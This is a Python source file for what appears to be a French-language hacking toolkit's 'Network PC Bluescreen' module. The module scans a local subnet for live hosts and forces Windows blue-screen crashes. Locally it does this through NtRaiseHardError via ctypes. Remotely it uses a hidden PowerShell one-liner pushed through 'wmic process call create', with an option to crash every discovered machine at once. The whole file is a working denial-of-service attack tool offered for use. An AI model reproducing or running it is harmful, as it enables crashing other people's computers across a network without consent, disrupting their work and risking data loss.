# Copyright (c) 2025-2026 v4lkyr0 — SINIX
# See the file 'LICENSE' for copying permission.

import subprocess
import socket
import ipaddress
import time
import traceback
import os
import ctypes
from concurrent.futures import ThreadPoolExecutor, as_completed

from Core.Utils import *

TIMEOUT     = 0.5
MAX_WORKERS = 100
LOG_FILE    = os.path.join(os.path.dirname(__file__), "..", "sinix_bluescreen.log")

def log(msg):
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"[{time.strftime('%H:%M:%S')}] {msg}\n")

def ping(ip):
    result = subprocess.run(
        ["ping", "-n", "1", "-w", str(int(TIMEOUT * 1000)), str(ip)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    return result.returncode == 0

def resolve_name(ip):
    try:
        return socket.gethostbyaddr(str(ip))[0].split(".")[0]
    except socket.herror:
        return str(ip)

def scan_network(network):
    live  = []
    hosts = list(ipaddress.ip_network(network, strict=False).hosts())
    log(f"Scan démarré sur {network} — {len(hosts)} hôtes")
    print(f"\n{LOADING} Scan en cours sur {green}{network}{reset}...\n")

    def check(ip):
        if ping(ip):
            return (str(ip), resolve_name(ip))
        return None

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {ex.submit(check, ip): ip for ip in hosts}
        for f in as_completed(futures):
            r = f.result()
            if r:
                live.append(r)

    live.sort(key=lambda x: socket.inet_aton(x[0]))
    log(f"Scan terminé — {len(live)} machine(s) trouvée(s): {[n for _,n in live]}")
    return live

def bluescreen_self():
    """
    Déclenche un BSOD sur la machine locale via NtRaiseHardError (ntdll.dll).
    Nécessite les privilèges SE_DEBUG_NAME activés au préalable.
    """
    log("BSOD self déclenché")
    print(f"\n{LOADING} Blue screen de cette machine...")

    # Active SE_DEBUG_NAME pour ntdll
    try:
        nt = ctypes.windll.ntdll
        kernel32 = ctypes.windll.kernel32

        # Élève les privilèges du processus courant
        token = ctypes.c_void_p()
        kernel32.OpenProcessToken(
            kernel32.GetCurrentProcess(),
            0x0028,  # TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY
            ctypes.byref(token)
        )

        class LUID(ctypes.Structure):
            _fields_ = [("LowPart", ctypes.c_ulong), ("HighPart", ctypes.c_long)]

        class LUID_AND_ATTRIBUTES(ctypes.Structure):
            _fields_ = [("Luid", LUID), ("Attributes", ctypes.c_ulong)]

        class TOKEN_PRIVILEGES(ctypes.Structure):
            _fields_ = [("PrivilegeCount", ctypes.c_ulong),
                        ("Privileges", LUID_AND_ATTRIBUTES * 1)]

        luid = LUID()
        ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeShutdownPrivilege", ctypes.byref(luid))

        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = 0x00000002  # SE_PRIVILEGE_ENABLED

        ctypes.windll.advapi32.AdjustTokenPrivileges(
            token, False, ctypes.byref(tp), 0, None, None
        )

        # NtRaiseHardError — STATUS_ASSERTION_FAILURE (0xC0000420) → BSOD immédiat
        response = ctypes.c_ulong(0)
        nt.RtlAdjustPrivilege(19, True, False, ctypes.byref(ctypes.c_bool()))
        nt.NtRaiseHardError(
            ctypes.c_ulong(0xC0000420),  # STATUS_ASSERTION_FAILURE
            ctypes.c_ulong(0),
            ctypes.c_ulong(0),
            ctypes.c_ulong(0),
            ctypes.c_ulong(6),           # OptionShutdownSystem
            ctypes.byref(response)
        )
    except Exception as e:
        log(f"Erreur BSOD self: {e}")
        print(f"{ERROR} Échec BSOD local: {e}")

def bluescreen_remote(ip, name):
    """
    Déclenche un BSOD sur une machine distante via WMIC + script PowerShell injecté.
    Utilise NtRaiseHardError côté distant via un one-liner PowerShell.
    """
    log(f"Tentative BSOD -> {name} ({ip})")
    print(f"\n{LOADING} Blue screen de {green}{name}{reset} ({ip})...")

    # PowerShell one-liner : élève SeShutdownPrivilege + NtRaiseHardError
    ps_payload = (
        "$a=Add-Type -Name W -Namespace '' -PassThru -MemberDefinition '"
        "[DllImport(\"ntdll.dll\")] public static extern uint NtRaiseHardError(uint ErrorStatus,uint NumberOfParameters,uint UnicodeStringParameterMask,IntPtr Parameters,uint ValidResponseOption,ref uint Response);';"
        "[uint]$r=0;"
        "$a::NtRaiseHardError(0xC0000420,0,0,[IntPtr]::Zero,6,[ref]$r)"
    )

    # Injection via WMIC process call create (même vecteur que Network-Pc-Disconnect)
    result = subprocess.run(
        [
            "wmic", f"/node:{ip}",
            "process", "call", "create",
            f"powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"{ps_payload}\""
        ],
        capture_output=True, text=True, timeout=15
    )

    if result.returncode == 0 and "ReturnValue = 0" in result.stdout:
        log(f"OK BSOD -> {name} ({ip})")
        print(f"{SUCCESS} BSOD déclenché sur {green}{name}{reset}.")
    else:
        err = result.stderr.strip() or result.stdout.strip() or "Erreur inconnue"
        log(f"ECHEC BSOD -> {name} ({ip}) | code={result.returncode} | {err}")
        print(f"{ERROR} Échec {green}{name}{reset}: {err}")

def bluescreen_all(machines):
    log(f"BSOD ALL déclenché — {len(machines)} machine(s)")
    print(f"\n{LOADING} Blue screen de {green}{len(machines)}{reset} machine(s) + cette machine...\n")

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {ex.submit(bluescreen_remote, ip, name): (ip, name) for ip, name in machines}
        for f in as_completed(futures):
            pass

    print(f"\n{SUCCESS} Commandes envoyées.")
    print(f"{LOADING} BSOD de cette machine dans 3 secondes...\n")
    time.sleep(3)
    bluescreen_self()

def display_machines(machines):
    print(f"\n{green}╓{'─' * 52}╖{reset}")
    print(f"{green}║{white}  {'N°':<6} {'NOM PC':<28} {'IP':<16}{green}║{reset}")
    print(f"{green}╙{'─' * 52}╜{reset}")
    for i, (ip, name) in enumerate(machines, 1):
        print(f"  {PREFIX1}{i}{SUFFIX1} {white}{name:<28}{reset} {green}{ip}{reset}")
    print(f"{green}{'─' * 54}{reset}")

def main():
    log("=== Lancement Network-Pc-Bluescreen ===")
    Title("Network PC Bluescreen")
    Clear()

    print(f"""
{green}╓──────────────────────────────────────╖{reset}
{green}║{white}       Network PC Bluescreen           {green}║{reset}
{green}╙──────────────────────────────────────╜{reset}
""")

    try:
        my_ip = socket.gethostbyname(socket.gethostname())
        log(f"IP locale détectée: {my_ip}")
    except Exception as e:
        my_ip = "192.168.1.1"
        log(f"Erreur détection IP: {e}")

    parts = my_ip.rsplit(".", 1)
    default_net = parts[0] + ".0/24" if len(parts) == 2 else "192.168.1.0/24"

    network = input(f"{INPUT} Plage réseau [{green}{default_net}{reset}] {green}->{reset} ").strip()
    if not network:
        network = default_net

    log(f"Plage choisie: {network}")
    machines = scan_network(network)

    if not machines:
        log("Aucune machine détectée")
        print(f"\n{ERROR} Aucune machine détectée. Vérifie la plage ou le pare-feu.\n")
        input(f"{INPUT} Appuie sur Entrée pour quitter {green}->{reset} ")
        return

    while True:
        Clear()
        display_machines(machines)

        print(f"\n  {PREFIX}A{SUFFIX} BSOD ALL   {PREFIX}S{SUFFIX} BSOD moi   {PREFIX}R{SUFFIX} Rescanner   {PREFIX}0{SUFFIX} Quitter\n")
        choice = input(f"{PREFIX}{socket.gethostname()}@SINIX{SUFFIX} {green}->{reset} ").strip().upper()
        log(f"Choix: {choice}")

        if choice == "0":
            log("Quitter")
            break

        if choice == "R":
            machines = scan_network(network)
            continue

        if choice == "S":
            confirm = input(f"\n{INPUT} BSOD CETTE machine ? {YESORNO} {green}->{reset} ").strip().lower()
            if confirm in ["y", "yes", "o", "oui"]:
                bluescreen_self()
            else:
                log("BSOD self annulé")
                print(f"{ERROR} Annulé.")
            continue

        if choice == "A":
            confirm = input(f"\n{INPUT} BSOD {green}TOUS{reset} les PC + cette machine ? {YESORNO} {green}->{reset} ").strip().lower()
            if confirm in ["y", "yes", "o", "oui"]:
                bluescreen_all(machines)
            else:
                log("BSOD ALL annulé")
                print(f"{ERROR} Annulé.")
            continue

        if choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(machines):
                ip, name = machines[idx]
                confirm  = input(f"\n{INPUT} BSOD {green}{name}{reset} ({ip}) ? {YESORNO} {green}->{reset} ").strip().lower()
                if confirm in ["y", "yes", "o", "oui"]:
                    bluescreen_remote(ip, name)
                    input(f"\n{INPUT} Entrée pour continuer {green}->{reset} ")
                else:
                    log(f"BSOD {name} annulé")
                    print(f"{ERROR} Annulé.")
            else:
                print(f"{ERROR} Numéro invalide. Entre 1 et {green}{len(machines)}{reset}.")
                input(f"{INPUT} Entrée pour continuer {green}->{reset} ")
        else:
            print(f"{ERROR} Entrée invalide.")

try:
    main()
except Exception:
    err = traceback.format_exc()
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n=== CRASH ===\n{err}\n")
    print(f"\n{ERROR} Erreur critique — consulte {green}sinix_bluescreen.log{reset} à la racine du projet.")
    input(f"\n{INPUT} Entrée pour quitter {green}->{reset} ")
